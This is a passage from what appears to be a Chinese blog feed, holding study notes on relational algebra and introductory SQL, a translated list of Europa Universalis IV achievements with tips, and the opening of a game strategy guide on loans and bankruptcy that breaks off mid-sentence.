alt="image-20200513184637038" title="image-20200513184637038"></p><p>例图：</p><p><img src="https://cos.gjcloak.xyz/NoteBook/20200513184414.png" alt="image-20200513184413001" title="image-20200513184413001"></p><h4 id="2-3-2-专门的关系运算"><a href="#2-3-2-专门的关系运算" class="headerlink" title="2.3.2 专门的关系运算"></a>2.3.2 专门的关系运算</h4><p>专门的关系运算包括选择、投影、连接、除运算等</p><h5 id="①-选择-selection"><a href="#①-选择-selection" class="headerlink" title="① 选择 selection"></a>① 选择 selection</h5><p><strong>选择元组</strong></p><p><img src="https://cos.gjcloak.xyz/NoteBook/20200513190153.png"></p><p><strong>示例 1：</strong>查询学生表 Student 中年龄小于 20 岁的学生的所有信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">σ age&lt;20 (Student)</span><br></pre></td></tr></table></figure><p>示例 2：</p><p><img src="https://cos.gjcloak.xyz/NoteBook/20200513190441.png" alt="image-20200513190439937" title="image-20200513190439937"></p><p>示例 3：</p><p><img src="https://cos.gjcloak.xyz/NoteBook/20200513190610.png" alt="image-20200513190609548" title="image-20200513190609548"></p><h5 id="②-投影-projection"><a href="#②-投影-projection" class="headerlink" title="② 投影 projection"></a>② 投影 projection</h5><p><img src="https://cos.gjcloak.xyz/NoteBook/20200513190838.png" alt="image-20200513190836995" title="image-20200513190836995"></p><p>投影操作主要是从列的角度进行运算，投影之后不仅取消了原关系中的某些列，而且还可能取消某些元组（避免重复行）</p><p><strong>选择列</strong></p><p>⚠ 注意：投影操作会去除列中的重复行</p><p><strong>示例：</strong>查询学生表Student中都有哪些系</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ⅱ Sdept (Student)</span><br></pre></td></tr></table></figure><p><img src="https://cos.gjcloak.xyz/NoteBook/20200513190805.png"></p><h5 id="③-连接-join"><a href="#③-连接-join" class="headerlink" title="③ 连接 join"></a>③ 连接 join</h5><p>连接也称 θ 连接。从两个关系的笛卡尔积中选取属性间满足一定条件的元组</p><p><img src="https://cos.gjcloak.xyz/NoteBook/20200513191053.png"></p><p>连接运算中有两种常用连接：</p><ul><li><strong>等值连接</strong>：θ 为 &#x3D; 的连接运算称为等值连接。他是从关系 R 与 S 的笛卡尔积中选取 A、B 属性值相等的那些元组</li></ul><p><img src="https://cos.gjcloak.xyz/NoteBook/20200513191442.png"></p><ul><li><strong>自然连接</strong>：自然连接是一种特殊的等值连接。它要求两个关系中进行比较的分量必须是同名的属性组，并且在结果中把重复的属性列去掉</li></ul><p><img src="https://cos.gjcloak.xyz/NoteBook/20200513191606.png"></p><p><strong>示例：</strong></p><p><img src="https://cos.gjcloak.xyz/NoteBook/20200513191843.png"></p><p><strong>在做自然连接的时候</strong>，两个关系中的某些元组可能会被抛弃，这些被舍弃的元组就称为<strong>悬浮元组</strong>。</p><ul><li>如果要把悬浮元组也留在结果中，而在其他属性上填NULL，那么这种连接就叫做<strong>外连接 outer join</strong></li><li><strong>左外连接 left join</strong>：只保留左表的悬浮元组</li><li><strong>右外连接 right join</strong>：只保留右表的悬浮元组</li></ul><p><img src="https://cos.gjcloak.xyz/NoteBook/20200513192305.png"></p><h5 id="④-除运算"><a href="#④-除运算" class="headerlink" title="④ 除运算"></a>④ 除运算</h5><h6 id="象集的概念"><a href="#象集的概念" class="headerlink" title="象集的概念"></a>象集的概念</h6><p><img src="https://cos.gjcloak.xyz/NoteBook/20200513192953.png" alt="image-20200513192951849" title="image-20200513192951849"></p><p>举例：</p><p><img src="https://cos.gjcloak.xyz/NoteBook/20200513193101.png" alt="image-20200513193100713" title="image-20200513193100713"></p><blockquote><p>给除运算下定义：</p></blockquote><p><img src="https://cos.gjcloak.xyz/NoteBook/20200513193142.png" alt="image-20200513193140757" title="image-20200513193140757"></p><p><code>R ÷ S = T</code> 表示 T 包含所有在 R 但不在 S 中的属性及其值，<strong>且 T 的元组与 S 的元组的 所有组合 都在 R中</strong></p><p><strong>示例：</strong>可以理解为在 R 中查找 B、C 属性和 S 中的 B、C 属性相同的，A 属性的值</p><p><img src="https://cos.gjcloak.xyz/NoteBook/20200513192635.png"></p><ul><li><p><strong>T 中包含所有在 R 但不在 S 中的属性及其值</strong></p><p>A在R中而不在S中，所以保留A属性，去掉 B、C、D三个属性</p></li><li><p><strong>且 T 的元组和 S 的元组的所有组合都在 R 中</strong></p><p>a1: a1 b1 c2 &#x2F; a1 b2 c1 &#x2F; a1 b2 c3 都在 R中</p><p>a2 : a2 b1 c2 不在 R 中 PASS!</p><p>a3：a3 b1 c2 不在 R 中 PASS!</p><p>a4：a4 b1 c2 不在 R 中 PASS！</p></li></ul><h4 id="2-3-3-关系代数习题"><a href="#2-3-3-关系代数习题" class="headerlink" title="2.3.3 关系代数习题"></a>2.3.3 关系代数习题</h4><p><strong>① 设有如下四个表：S（供应商表）P（零件表）J（工程项目表）SPJ（供应情况表）</strong></p><p><img src="https://cos.gjcloak.xyz/NoteBook/20200513193342.png"></p><p><img src="https://cos.gjcloak.xyz/NoteBook/20200513193400.png"></p><p><img src="https://cos.gjcloak.xyz/NoteBook/20200513193632.png"></p><p><strong>② 设有如图所示的关系S、SC 和 C, 试用关系代数表达式表示下列查询语句:</strong> </p><p><img src="https://cos.gjcloak.xyz/NoteBook/20200513193721.png" alt="image-20200513193720599" title="image-20200513193720599"></p><ul><li><p>检索”程军”老师所授课的课程号(C#)和课程名(CNAME)</p><p>ⅡC#,CNAME (σ TEACHER &#x3D; ‘程军’(C) )</p></li><li><p>检索年龄大于21的男学生学号(S#)和姓名(SNAME)</p><p>ⅡS#,SNAME (σ AGE &gt; ‘21’ ∧ SEX &#x3D; ‘男’(S) )</p></li><li><p>检索至少选修”程军”老师所授全部课程的学生姓名(SNAME)</p><p><strong>关键字：至少 —— 用除法</strong></p><p>ⅡSNAME ( ( <strong>ⅡS#,C#(SC)</strong> ÷ <strong>ⅡC#(σ TEACHER &#x3D; ‘程军’(C))</strong> ) ⚮ S )</p></li><li><p>检索”李强”同学不学课程的课程号(C#)</p><p><strong>关键字：不 —— 用减法</strong></p><p>ⅡC#(C) - ⅡC#( σSNAME &#x3D; ‘李强’(S) ⚮ SC )</p></li><li><p>检索全部学生都选修的课程的课程号(C#)和课程名(CNAME)</p><p>ⅡC#,CNAME(ⅡS#,C#(SC) ÷ ⅡS#(S) ⚮ C )</p></li><li><p>检索选修课程包含”程军”老师所授课程之一的学生学号(S#)</p><p>ⅡS#(σTEACHER &#x3D; ‘程军’(C) ⚮ SC)</p></li><li><p>检索选修课程号为k1和k5的学生学号(S#)</p><p>ⅡS#,C#(SC) ÷ ⅡC#(σ C#&#x3D;k1 ∨ C# &#x3D; k2(C))</p></li><li><p>检索选修全部课程的学生姓名(SNAME)</p><p><strong>关键字：全部 —— 用除法</strong></p><p>ⅡSNAME( ( ⅡS#,C#(SC) ÷ ⅡC#(C) ) ⚮ S)</p></li><li><p>检索选修课程包含学号为2的学生所选修的全部课程的学生学号(S#)</p><p>ⅡS#,C#(SC) ÷ ⅡC#(σ S# &#x3D; 2(SC) )</p><p>所有学号, 课程号 ÷ 学号为2的学生选修的课程号</p></li><li><p>检索选修课程名为’C语言’的学生学号(S#)和姓名(SNAME)</p><p>ⅡS#,SNAME(<strong>ⅡS#( SC ⚮ (σCNAME &#x3D; ‘C语言’(C)) )</strong> ⚮ S)</p></li><li><p>检索没有一门课程成绩不及格的学生学号、姓名</p><p>ⅡS#,SNAME( (<strong>ⅡS#(S) - ⅡS#(σ GRADE &lt; 60(SC)</strong> ) ⚮ S )</p></li></ul><h2 id="第三章-关系数据库标准语言-SQL"><a href="#第三章-关系数据库标准语言-SQL" class="headerlink" title="第三章 关系数据库标准语言 SQL"></a>第三章 关系数据库标准语言 SQL</h2><h3 id="3-1-SQL-概述"><a href="#3-1-SQL-概述" class="headerlink" title="3.1 SQL 概述"></a>3.1 SQL 概述</h3><p>SQL（Structured Query Language）：结构化查询语言</p><p>大部分 DBMS 产品都支持 SQL，成为操作数据库的标准语言</p><h4 id="3-1-1-SQL-数据库的体系结构"><a href="#3-1-1-SQL-数据库的体系结构" class="headerlink" title="3.1.1 SQL 数据库的体系结构"></a>3.1.1 SQL 数据库的体系结构</h4><p>SQL 语言支持的关系数据库的三级模式结构</p><p><img src="https://cos.gjcloak.xyz/NoteBook/20200514201039.png" alt="image-20200514201037080" title="image-20200514201037080"></p><p>说明：</p><ul><li>用户可以用 SQL 语言对视图（View）和基本表（Base Table）进行查询等操作，在用户观点里，视图和表一样，都是关系。</li><li>视图是从一个或多个基本表中导出的表，本身不存储在数据库中，只有其定义，可以将其理解为一个虚表。</li><li>基本表是本身独立存在的表，一个表可以带若干索引，存储文件及索引组成了关系数据库的内模式。</li></ul><h4 id="3-1-2-SQL-的功能"><a href="#3-1-2-SQL-的功能" class="headerlink" title="3.1.2 SQL 的功能"></a>3.1.2 SQL 的功能</h4><p>（1）数据定义（DDL）</p><ul><li>定义、删除模式</li><li>定义、删除、修改关系模式（基本表）</li><li>定义、删除视图（View）</li><li>定义、删除索引（Index）</li></ul><p>（2）数据操纵（DML）</p><ul><li>数据查询</li><li>数据增、删、改</li></ul><p>（3）数据控制（DCL）</p><ul><li>用户访问权限的授予、收回</li></ul><h4 id="3-1-3-SQL-的特点"><a href="#3-1-3-SQL-的特点" class="headerlink" title="3.1.3 SQL 的特点"></a>3.1.3 SQL 的特点</h4><p>（1）高度非过程化的语言</p><ul><li>用户只需提出“干什么”，至于“怎么干”由 DBMS 解决；用户只需要在查询语句中提出需要什么，DBMS即可按路径存取，并把结果返回给用户。</li></ul><p>（2）面向集合的操作方式</p><ul><li>每一个 SQL 的操作对象是一个或多个关 系，操作的结果也是一个关系。</li></ul><p>（3）同一种语法结构，两种使用方式</p><ul><li>即可独立使用，又可嵌入到 宿主语言中使用，具有自主型和宿主型两种特点。</li></ul><p>（4）具有查询、操作、定义和控制四种语言一体化的特点</p><ul><li>它只向用户提供一种语言，但该语言具有上述多种功能，且每种操作只需一种操作符。</li></ul><p>（5）语言简洁、易学易用：核心功能只有 9 个动词，语法简单，<br>接近英语。</p><p>SQL 功能</p><p>动词</p><p>数据库查询</p><p>SELECT</p><p>数据定义</p><p>CREATE，DROP ，ALTER</p><p>数据操纵</p><p>INSERT，UPDATE，DELETE</p><p>数据控制</p><p>GRANT，REVOKE</p><h3 id="3-2-SQL-基本语法"><a href="#3-2-SQL-基本语法" class="headerlink" title="3.2 SQL 基本语法"></a>3.2 SQL 基本语法</h3><h4 id="3-2-1-数据类型"><a href="#3-2-1-数据类型" class="headerlink" title="3.2.1 数据类型"></a>3.2.1 数据类型</h4><p>SQL 语言支持的主要数据类型有：</p><p>数据类型</p><p>解释</p><p>CHAR(n)</p><p>固定长度为 n 的字符串型</p><p>VARCHAR (n)</p><p>最大长度为 n 的变长字符串型</p><p>INT</p><p>4 字节的整型</p><p>NUMERIC(n,s)</p><p>数值型，最大精度 n，s 为小数位数</p><p>DATE</p><p>日期型，包括年( 4 位)、月、日</p><p>Money</p><p>货币型( 8 字节,精确到货币单位的千分之十)</p><h4 id="3-2-2-函数"><a href="#3-2-2-函数" class="headerlink" title="3.2.2 函数"></a>3.2.2 函数</h4><ul><li>数字函数：ABS(X), SQRT(X), RAND(X), LOG(X), …</li><li>字符函数：LENGTH(X), LOWER(X), UPPER(X), SUBSTRING(expression, start, length)…</li><li>分组函数：COUNT(＊), MAX(X), MIN(X), AVG(X), SUM(X)</li></ul><h4 id="3-2-3-运算符"><a href="#3-2-3-运算符" class="headerlink" title="3.2.3 运算符"></a>3.2.3 运算符</h4><ul><li>句法操作符：&amp;</li><li>数值操作符：+,－,＊,／, …</li><li>逻辑操作符：&#x3D;,&gt;,&lt;,≤,≥,≠,IN,ANY,ALL, …</li><li>查询表达式操作符： UNION,…</li></ul><h4 id="3-2-4-SQL-语句格式符号"><a href="#3-2-4-SQL-语句格式符号" class="headerlink" title="3.2.4 SQL 语句格式符号"></a>3.2.4 SQL 语句格式符号</h4><ul><li>大括号 { }：大括号中的内容为必选参数，其中可有多个选项，各选项之间用竖线分隔，用户必须选择其中的一项。</li><li>方括号 [ ]：方括号中的内容为可选项，用户根据需要选用。</li><li>竖线 ：表示参数之间‘或’的关系。</li><li>省略号 “…”：表示重复前面的语法单元。</li></ul><h3 id="3-3-数据定义"><a href="#3-3-数据定义" class="headerlink" title="3.3 数据定义"></a>3.3 数据定义</h3><p>DDL，Data Definition Language</p><p>关系数据库系统支持三级模式结构，其模式，外模式，内模式中的基本对象有模式、表、视图和索引，所以 SQL 的数据定义功能包括模式定义、表定义、视图和索引的定义</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://www.bilibili.com/video/BV1ux411G7Bs">东南大学 - 徐立臻 - 数据库原理及应用</a></p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据库 </tag>
            
            <tag> 学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>EU4 部分成就及其中文化翻译</title>
      <link href="/b0a49472.html"/>
      <url>/b0a49472.html</url>
      
        <content type="html"><![CDATA[<h2 id="行政类及特殊政治目标成就"><a href="#行政类及特殊政治目标成就" class="headerlink" title="行政类及特殊政治目标成就"></a>行政类及特殊政治目标成就</h2><ol><li><p>The Emperors new clothes<br>Overthrow Austria and become the Emperor of the Holy Roman Empire.<br>皇帝的新衣——踢掉奥皇并且成为神罗帝国的皇帝</p></li><li><p>Respected<br>Have 100 prestige, 100 legitimacy and three stability.<br>倍受尊敬——声望，正统性和国家稳定度全满</p></li><li><p>True Catholic<br>Control three Cardinals.<br>真信徒——控制三个红衣主教</p></li><li><p>Truly Divine Ruler<br>Get a 5&#x2F;5&#x2F;5 Ruler.<br>真命天子——获得一个三围能力为5-5-5的君主<br>君主制国家完全靠运气，选举制国家总统连任四届后能力将升为555</p></li><li><p>No Pirates in my Caribbean<br>Own the entire Caribbean.<br>我的加勒比不可能有海盗——拥有整个加勒比海地区</p></li><li><p>Agressive Expander<br>Own 200 provinces.<br>沙文主义者——拥有200个省份</p></li><li><p>A Kaiser not just in name<br>Enact all reforms in the Holy Roman Empire.<br>凯撒不仅仅是个名字——推行所有神罗改革和决议</p></li><li><p>Ruina Imperii<br>Dismantle the Holy Roman Empire.<br>帝国的毁灭——解散神罗。</p></li><li><p>World Conqueror<br>Conquer the World.<br>世界征服者——成为酋（球）长</p></li><li><p>Just a Little Patience<br>Play a campaign from 1444 until 1820.<br>只需要一点耐心——从1444年剧本建立游戏，一直玩到1820年。</p></li><li><p>The Re-Reconquista<br>Reconquer all of Iberia as Granada.<br>真.再征服运动——使用格兰纳达，对伊比利亚地区完成反征服。</p></li><li><p>Turn the Table<br>As a colony, break free and vassalize your former overlord.<br>扭转命运——作为一个殖民地，成功独立并且附庸你原来的宗主国。需要购买征服美洲DLC，否则无法控制该殖民地国家。</p></li><li><p>A Protected Market<br>Have 100% Mercantilism<br>被保护的市场——达到100%的重商主义政策。</p></li><li><p>The Princess is in this Castle<br>Have a female heir and a Royal Palace.<br>城堡里的公主——有一个女性继承人，并且修筑有特殊建筑大宫殿。</p></li><li><p>Electable!<br>Become an elector in the HRE as a country which does not start as elector.<br>候选资格——选一个一开始没有皇帝选帝资格的神罗成员国，获得选帝侯资格。</p></li><li><p>Vasa or Wettin?<br>Get a ruler of your dynasty on the throne of Poland or the Commonwealth while they are an elective monarchy.<br>华沙还是韦丁——当你的国家面临选择成为波兰国王还是成立波兰-立陶宛联合王国的时候，做出一项政体选择。</p></li></ol><h2 id="外交类成就"><a href="#外交类成就" class="headerlink" title="外交类成就"></a>外交类成就</h2><ol><li><p>Until death do us apart<br>Secure a Royal Marriage with another country.<br>只有死亡能够将我们分离——和另一个国家王室联姻</p></li><li><p>For the Glory<br>Diplo-annex a vassal.<br>为了荣耀——合并自己的一个附庸国</p></li><li><p>Royal Authority<br>Install an union through a succession war.<br>皇家权威——通过一场继承权战争建立一个联合统治国家</p></li><li><p>Viva la Revolución!<br>Have rebels you support in another country enforce their demands.<br>革命万岁——支持其他国家的一个叛党并且让他们的要求得到满足</p></li><li><p>Grand Coalition<br>Join a coalition of more than 5 nations.<br>大包围网——加入一个至少有5个国家参与的包围网联盟</p></li><li><p>Double the Love<br>Start with no unions and get two at the same time.<br>双份的爱——原本没有任何联合统治国家，然后获得两个（需要在一个时期内两个联统国家并存）。</p></li><li><p>The Grand Armada<br>Have 500 heavy ships and no loans.<br>大舰队——拥有500艘大型重舰并且没有负债。</p></li></ol><h2 id="军事类成就"><a href="#军事类成就" class="headerlink" title="军事类成就"></a>军事类成就</h2><ol><li><p>Victorious!<br>Win a war.<br>胜利——赢得一场战争的胜利</p></li><li><p>That is mine!<br>Conquer a province.<br>那是我的——占领一个省份</p></li><li><p>That’s a Grand Army<br>Build up your army to your country’s maximum army forcelimit.<br>那是一只大军团——把你的陆军数量增加到你的上限</p></li><li><p>That’s a Grand Navy<br>Build up your navy to your country’s maximum navy forcelimit.<br>那是一只大舰队——把你的海军数量增加到你的上限</p></li><li><p>Defender of the Faith<br>Become Defender of the Faith.<br>信仰守护者——成为信仰守护者</p></li><li><p>Seriously?!<br>Kill 10,000 men in one battle.<br>你是认真的？——一次战斗中战死10000个士兵。</p></li><li><p>Cold War<br>Win a war without fighting a single battle.<br>冷战——不打一场战斗而赢得战争<br>（可以通过派间谍，封锁港口、爆厌战度等方式。推荐使用西班牙，和奥地利开战时派舰队到威尼斯封锁港口他就过不来了，还能100%封锁对方港口，等他厌战度爆掉就好了，靠陆军反正也肯定打不过奥皇）</p></li><li><p>Brothers in Arms<br>Win a war as a secondary participant.<br>兄弟连——作为陪同参战国（非盟主）参加战争并且赢得胜利</p></li><li><p>My armies are invincible!<br>Gain at least 7.0 land morale.<br>我的军队是不可战胜的——陆军士气达到至少7</p></li><li><p>This navy can take it all<br>Gain at least 7.0 naval morale.<br>这只海军可以处理一切——海军士气达到至少7</p></li><li><p>Traditional Player<br>More than 90 percent Naval and Army Tradition.<br>传统玩家——90点以上的陆军和海军传统</p></li><li><p>It’s all about luck<br>Win a battle against a great leader, without a leader.<br>这场战争取决于运气——使用一只没有将领的军队，迎战一只有伟大将领的军队，然后打赢了。</p></li><li><p>Winged Hussars<br>Have Winged Hussars as your active unit with more than +50% cavalry combat ability.<br>翼骑兵——拥有并购买翼骑兵这种能够提升50%骑兵冲锋能力的兵种。近东科技组在军事等级22级后可以解锁此兵种。</p></li></ol><h2 id="探索类成就"><a href="#探索类成就" class="headerlink" title="探索类成就"></a>探索类成就</h2><ol><li><p>Down Under<br>Have a colony in Australia.<br>袋鼠王国——在澳洲殖民一个地方</p></li><li><p>Isn’t this the way to India?<br>Discover the Americas as Castile or Spain.<br>这不是去印度的道路吗？——在玩卡斯提尔或者西班牙的时候发现美洲</p></li><li><p>At every continent<br>Own one province on each continent.<br>在每个大陆上——在每个大陆上都拥有一个核心省份<br>（推荐控制伊斯坦布尔，似乎默认同时处在欧洲和亚洲）</p></li><li><p>World Discoverer<br>Discover the whole world.<br>世界探索家——探索出整个世界的地图</p></li><li><p>The Five Colonies<br>Have five colonial nations.<br>五个殖民国家——拥有五个殖民国家。殖民国家只有在美洲和澳洲的殖民地可能形成，可以参照殖民地图模式。</p></li></ol><h2 id="贸易及财富类成就"><a href="#贸易及财富类成就" class="headerlink" title="贸易及财富类成就"></a>贸易及财富类成就</h2><ol><li><p>It’s all about the money<br>Accumulate 3000 gold.<br>一切向钱看——攒够3000个金币</p></li><li><p>Market Control<br>Be trade leader of seven different goods.<br>控制市场——成为七种不同商品的垄断者</p></li><li><p>Four For Trade<br>Form four Trade Companies and get bonus merchants from all of them<br>四笔贸易——组建四个贸易公司，并且从这四家公司获得分红。需要购买国富论DLC才能成立贸易公司。</p></li><li><p>A Protected Market<br>Have 100% Mercantilism<br>被保护的市场——达到100%的重商主义政策。</p></li><li><p>A Pile of Gold<br>Own 10 provinces which produce gold.<br>蜂拥而至的黄金——拥有10个生产黄金的省份</p></li></ol><h2 id="特定国家任务成就"><a href="#特定国家任务成就" class="headerlink" title="特定国家任务成就"></a>特定国家任务成就</h2><ol><li><p>Azur semé de lis or<br>Get all the French Cores as France.<br>法兰西万岁——玩法兰西的时候统一所有有法国核心的地方</p></li><li><p>Not so sad a state…<br>As Portugal, have a colony in Brazil and in Africa.<br>不那么差的结果——玩葡萄牙，在巴西和非洲各有一块殖民地</p></li><li><p>Master of India<br>Own all of India as a European nation.<br>印度总督——玩一个欧洲国家，拥有整个印度地区</p></li><li><p>Sweden is not overpowered!<br>Own the entire Baltic coastline as Sweden.<br>瑞典永远不过被高估——使用瑞典，拥有所有波罗的海地区</p></li><li><p>The pen is mightier than the sword<br>Have three unions at the same time as Austria.<br>笔锋的威力强于枪刃——玩奥地利，同时拥有三个联合统治国家</p></li><li><p>Italian Ambition<br>Form Italy.<br>意大利的雄心——成立意大利<br>（使用意大利地区国家，触发成立意大利事件）</p></li><li><p>All belongs to Mother Russia<br>Form Russia.<br>一切都属于俄国母亲——触发成立俄罗斯事件</p></li><li><p>Spain is the Emperor<br>Become the Emperor of the Holy Roman Empire as Spain.<br>西班牙是个帝国——作为西班牙，成为神罗皇帝<br>（这显然是对应EU3那个“西班牙不是一个帝国”的梗）</p></li><li><p>An early Reich<br>Form Germany.<br>新生的德意志——触发成立德意志事件</p></li><li><p>Poland can into space<br>As Poland, reach the maximum level in all technologies (32).<br>波兰人可以登录月球——使用波兰，所有科技升到最高级（32级）</p></li><li><p>The Chrysanthemum Throne<br>Unite Japan as a Daimyo.<br>菊之王座——使用大名统一日本</p></li><li><p>Basileus<br>Restore the Roman Empire.<br>巴塞勒斯——触发重建罗马帝国事件</p></li><li><p>Norwegian Wood<br>Own all naval supplies provinces as Norway.<br>挪威的森林——使用挪威，拥有所有特产品为木材的省份</p></li><li><p>African Power<br>Own all provinces in Africa as Kongo.<br>非洲力量——使用刚过，拥有所有非洲省份</p></li><li><p>No trail of tears<br>Own the Thirteen Colonies as a westernized Cherokee.<br>没有血泪之路——使用一个美洲土著国家，完成西方化，拥有北美十三州，消除美国产生的可能。</p></li><li><p>One night in Paris<br>Own Paris as England or Great Britain.<br>巴黎一夜——使用英格兰或大不列颠，拥有巴黎。</p></li><li><p>Definitely the Sultan of Rum<br>Own Rome, Moscow and Istanbul as Ottomans.<br>罗姆（罗马）的苏丹——使用奥斯曼，拥有罗马，莫斯科和伊斯坦布尔。</p></li><li><p>The Three Mountains<br>Conquer the World as Ryukyu.<br>三座大山——使用琉球，征服世界</p></li><li><p>Jihad<br>As Najd, conquer Europe, Africa and Asia and convert it to Sunni religion.<br>圣战——使用麦加，征服欧洲、非洲、亚洲并将所有地区信仰转化为逊尼派</p></li><li><p>Sunset Invasion<br>Conquer Lisbon, Madrid, Paris, London, Amsterdam and Rome as the Aztec.<br>日落入侵——使用阿兹特克帝国，征服里斯本，马德里，巴黎，伦敦，阿姆斯特丹和罗马</p></li><li><p>Luck of the Irish<br>Conquer the British Isles as an an Irish nation.<br>爱尔兰的命运——使用一个爱尔兰地区国家，征服不列颠岛。</p></li><li><p>Trade Hegemon<br>Conquer Aden, Hormoz and Malacca with any Western European country.<br>贸易巨鳄——使用一个西方国家，征服阿丹（也门首府），霍尔木兹和马拉加。以上三地是穆斯林国家在地中海的贸易中心。</p></li><li><p>Liberty or Death<br>Start as USA in 1776 bookmark and own all your cores while being at peace.<br>自由，或是死亡——使用1776年的美国独立战争开档，然后在和平（不和殖民地国家开战）的前提下拥有全部有核心的领土。独立战争打赢英国后一口气要求所有核心地就好了。</p></li><li><p>Nobody wants to die<br>Own Timbuktu as Songhai<br>没有人想灭亡——使用桑海帝国（西非的一个国家，盛产黄金），拥有廷巴克图</p></li><li><p>Turning the Tide<br>Start as a Steppe Horde in 1444, and fully westernize.<br>扭转潮流——使用1444年剧本的一个游牧民族，完成西方化改革。</p></li><li><p>In the Name of the Father<br>As an Orthodox country, have 100 Patriarch Authority.<br>以父之名——使用一个正教国家，达成100%宗教权威。</p></li><li><p>The Rising Sun<br>Own all of Japan as a European nation.<br>日出之国——使用一个西方国家，拥有整个日本</p></li><li><p>The Great Khan<br>As the Mongol Khanate or the Golden Horde, conquer or vassalize the Chinese, Russian and Persian regions.<br>天可汗——使用蒙古或者金帐王国，征服或者附庸中国，俄罗斯和波斯地区。</p></li><li><p>Je maintiendrai<br>Form the Netherlands as a minor nation starting with Dutch culture.<br>荷兰精神——使用一个荷兰文化的小国，并且成立荷兰。</p></li><li><p>Queen of Mercury<br>As Kilwa, own Zanzibar and Bombay (North Konkan).<br>商业女王——使用基尔瓦（坦桑尼亚地区小国），拥有桑给巴尔和Bombay（西非贡根地区的那个）</p></li><li><p>Sons of Carthage<br>As Tunisia, own Sicily, Sardinia, the Balearic Islands, the coast of Algiers and the southern coast of Spain.<br>迦太基的继承人——使用突尼斯，拥有西西里，撒丁岛，巴利阿里群岛（马略卡及周边几个小岛），奥尔吉尼亚的海岸行省和西班牙的南海岸行省）</p></li><li><p>Sinaasappel!<br>Get Orangists in power with 100% Republican Tradition, and owning a province in China.<br>开发远东——在维民所示DLC中，荷兰共和国是没有一般性的共和国选举和换届的。荷兰共和国有一种特殊的机制叫做“中央集权主义者（Statists，保皇党） VS 地方自治主义者（Orangists，奥兰治党，也叫橘党）”，这两种势力的高低取决于两边所占共和国内的政治力量。当中央集权主义者当权的时候，你会拥有+10的海军上限以及+5%的贸易额，同时你的共和传统上升较快。然当地方自治主义者当权之时，你的陆军将得到+25%的上限加成，-10%的稳定花费，但是共和传统将不会逐年自然增加。如果保皇党掌握国家，那么最高领袖选举将会每4年举办一次。玩家将会得到两个随机能力的候选人，其中一个将会加强中央集权主义者的政治力量，另一个则会增加地方自治主义者的政治力量；如果奥兰治党掌握国家机器，最高领袖将终生统治整个国家，除非中央集权主义者的政治力量重新高过地方自治主义者的政治力量。<br>要完成这个成就，需要作为荷兰共和国，让奥兰治党占据100%的一会比重，然后拥有一个中国省份。</p></li><li><p>One King to Rule!<br>As Poland, become an absolutist monarchy, abolishing the Sejm.<br>君权至上——使用波兰，成为一个完全君主制国家，废除议会制度。政治科技等级20后可以选择此项政体。</p></li><li><p>Venetian Sea<br>Have a 90% Trade share in both the Alexandria and Constantinople nodes as Venice, owning less than 10 cities.<br>威尼斯的海洋——在亚历山大和康斯坦布尔两大贸易中心同时拥有90%以上市场份额，并且只拥有少于10个的城市。</p></li></ol><p>35.The Iron Price<br>Restore the Danelaw region to Danish rule, and make it Danish culture.<br>钢铁价格——让丹麦统治所有丹麦地区，包括英格兰的“丹麦法区“（也就是阿尔佛雷德大帝曾经划分的领域，约为今日英格兰东部），并且全部将其转变为丹麦文化。</p><h2 id="汉化版本完成成就的方法"><a href="#汉化版本完成成就的方法" class="headerlink" title="汉化版本完成成就的方法"></a>汉化版本完成成就的方法</h2><ol><li><p>所有成就必须在铁人模式下完成。</p></li><li><p>目前52论坛的1.73版本汉化可以开启铁人模式，可以完成成就，但是偶尔会跳出，请注意经常手动存档。自动存档读取后会失去铁人模式。</p></li><li><p>以前版本的汉化都无法开启铁人模式。可以参考此MOD完成成就：<a href="http://bbs.3dmgame.com/thread-4328643-1-1.html%EF%BC%8C%E4%BD%BF%E7%94%A81.61%E4%BB%A5%E5%89%8D%E7%89%88%E6%9C%AC%E3%80%82">http://bbs.3dmgame.com/thread-4328643-1-1.html，使用1.61以前版本。</a></p></li></ol>]]></content>
      
      
      <categories>
          
          <category> P社 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 成就 </tag>
            
            <tag> 翻译 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《贷款埋葬过去 破产成就未来》贴吧搬运 萌新向贷款及破产常态化攻略</title>
      <link href="/1769.html"/>
      <url>/1769.html</url>
      
        <content type="html"><![CDATA[<p>先举一个具体的例子 是我们喜闻乐见的拜占庭 拜占庭破局一般被认为是入门的标准</p><p>各种难度 各种千奇百怪的思路层出不穷</p><p>但是在我观察 大部分思路都过于依赖其他国家的帮助 而否定罗马人民自己的力量</p><p>因为打开游戏第一反应 拜占庭只有三块地 军队一万多 而面对的是曼哥这样的庞然大物</p><p>这样悬殊的实力对比让我们望而却步不敢动筷子</p><p><strong>第一步 要正确的认识自己</strong></p><p>还是拜占庭的例子</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/image-46-1024x614.png" alt="image"></p><p>再常见不过的拜占庭开局 没有任何操作 只要看明白了楼上的图 我以为在游戏认识上提升了一个台阶</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/image-47-1024x614.png" alt="image"></p><p>到底是什么样的魔法能让拜占庭在1444年获得两千多块的国库</p><p>我们要认识到我们所操作的国家的真实潜力</p><p>当你缺钱的时候 这个潜力是贷款上限</p><p>当你缺兵的时候 这个潜力是人力和雇佣兵上限</p><p>钱和兵也就是我们一般认为的国力（游戏里）</p><p>那就很明白了 构成我们国力上限的 就是贷款上限和陆军上限</p><p>如果是刚理解我说的这些话的朋友 我骄傲的说 这是通往新世界的大门 并且我一定程度上可以告诉你这扇门后面有什么 这也就是这个贴的意义所在</p><p>我们萌新刚入坑的时候 玩拜占庭面对土鸡这样的大国是很绝望的 因为明显我们打不过他 他有这么多兵 这么多钱 打急了还会贷款爆佣兵</p><p>但是 如果给我们两千块钱 那情况就不一样了 这个游戏就回到了我们最喜欢的那种 雇佣兵骑脸 直接A 拿钱砸也砸死他</p><p>这个道理很多人都知道 即使不知道 看到这里也知道了 但是还是很难以接受</p><p>大部分人有一个刻板印象 